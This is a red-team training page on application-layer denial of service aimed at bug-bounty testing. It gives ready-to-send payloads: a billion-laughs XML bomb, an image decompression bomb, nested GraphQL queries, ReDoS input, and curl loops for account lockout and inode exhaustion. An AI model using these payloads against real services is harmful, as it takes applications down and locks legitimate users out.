---
layout: training-page
title: "Application-Layer Denial of Service — Red Team Academy"
module: "Web Hacking"
tags:
  - dos
  - redos
  - xml-bomb
  - resource-exhaustion
  - graphql
  - web
page_key: "web-application-dos"
render_with_liquid: false
---

# Application-Layer Denial of Service

Application-layer DoS differs from network flooding: instead of saturating bandwidth, it exhausts server-side resources (CPU, memory, file handles, threads) by exploiting how the application processes input. A single request can cause catastrophic resource consumption if it triggers an unbounded operation — parsing, regex evaluation, recursive expansion, or image processing. These techniques are relevant for bug bounty (where they are often in scope for high-severity findings) and red team engagements against web applications.

## XML Bomb (Billion Laughs Attack)

An XML document that uses recursive entity expansion to achieve exponential memory consumption. Entity `&lol9;` expands to 10^9 copies of the string "lol", consuming gigabytes of RAM during parsing.

{% raw %}

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

{% endraw %}

Send this to any endpoint that parses XML: SOAP services, XXE-enabled XML parsers, SVG upload handlers, or Office document processors. Combine with the SVG vector below for file upload endpoints.

## SVG / Image Processing DoS

Image processing libraries are a common target. The server receives an image, passes it to a resizing or conversion library, and that operation consumes unbounded resources.

- **SVG billion laughs**: SVG is XML — embed recursive entity expansion in an SVG file and upload it to an avatar or image upload endpoint.
- **Pixel bomb**: Create an image with valid headers claiming dimensions of 100,000 x 100,000 pixels but minimal actual data. When the application tries to allocate the canvas, memory exhaustion occurs.
- **ImageMagick decompression bomb**: Use a heavily compressed PNG that expands to gigabytes of pixel data.

```
# Create a PNG "decompression bomb" — 1 pixel source, massive declared dimensions
convert -size 20000x20000 xc:white bomb.png

# Test whether the server processes image dimensions
curl -X POST https://example.com/upload \
  -F "file=@bomb.png;type=image/png"
```

## GraphQL Depth and Complexity DoS

GraphQL APIs that lack query complexity limits or maximum depth enforcement are vulnerable to deeply nested queries that trigger N+1 database queries and CPU exhaustion.

```
# Deeply nested query — triggers recursive JOIN chain in many ORMs
query {
    repository(owner:"rails", name:"rails") {
        assignableUsers(first: 100) {
            nodes {
                repositories(first: 100) {
                    nodes {
                        assignableUsers(first: 100) {
                            nodes {
                                repositories(first: 100) {
                                    nodes { id }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

Send this query to `/graphql` or the application's GraphQL endpoint and observe response time. Each nesting level multiplies the database query count.

## Regular Expression DoS (ReDoS)

Catastrophic backtracking in regular expressions causes exponential CPU usage. When an application applies a vulnerable regex to attacker-controlled input, a crafted string can make the server spend minutes or hours evaluating a single request.

Vulnerable regex patterns typically have nested quantifiers or alternation with overlap:

```
# Vulnerable pattern: (a+)+ or (a|aa)+ on long strings
# Input that triggers catastrophic backtracking:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX

# Test with curl — measure response time
time curl -s "https://example.com/validate?input=aaaaaaaaaaaaaaaaaaaaaaaaaX"

# Common vulnerable contexts:
# - Email validation
# - URL validation
# - Password strength checkers
# - Search/filter fields
# - Log parsing endpoints
```

## Account Lockout DoS

If an application locks accounts after N failed login attempts, an attacker can lock out legitimate users by deliberately triggering the lockout threshold.

```
# Lock out a target account with repeated bad password attempts
for i in $(seq 1 100); do
  curl -s -o /dev/null -X POST \
    -d "username=victim@example.com&password=wrongpassword$i" \
    https://example.com/login
done
```

**Warning**: This is typically out-of-scope in bug bounty programs and can cause real harm to legitimate users. Only test with explicitly authorized accounts on a test environment.

## Filesystem Inode Exhaustion

If an application writes files to disk (log files, uploads, temporary files), an attacker can exhaust the filesystem's inode or file limit by repeatedly triggering file creation:

```
# Trigger file creation via rapid requests
for i in $(seq 1 10000); do
  curl -s -o /dev/null "https://example.com/export?format=pdf&id=$i" &
done
wait
```

Relevant filesystem limits:

| Filesystem | Maximum Inodes | Maximum File Size |
| --- | --- | --- |
| EXT4 | ~4 billion | 16 TB |
| FAT32 | ~268 million files | 4 GB |
| NTFS | ~4.2 billion (MFT entries) | 16 EB |
| XFS | Dynamic (disk-size dependent) | 8 EB |
| BTRFS | 2^64 | 16 EB |
| ZFS | ~281 trillion | 16 EB |

## Detection Signals

Application-layer DoS typically manifests as:

- Dramatically increased response times (5-30+ seconds) for targeted endpoints
- HTTP 503 or 504 responses under load
- Server-side CPU spikes visible in monitoring
- Out-of-memory errors in application logs
- The application recovers quickly after the attack stops (unlike network-layer DoS)

## Resources

- Practical Exploitation of DoS in Bug Bounty — Roni Lupin Carta — DEF CON 32 — `youtube.com/watch?v=b7WlUofPJpU`
- Denial of Service Cheat Sheet — OWASP — `cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html`
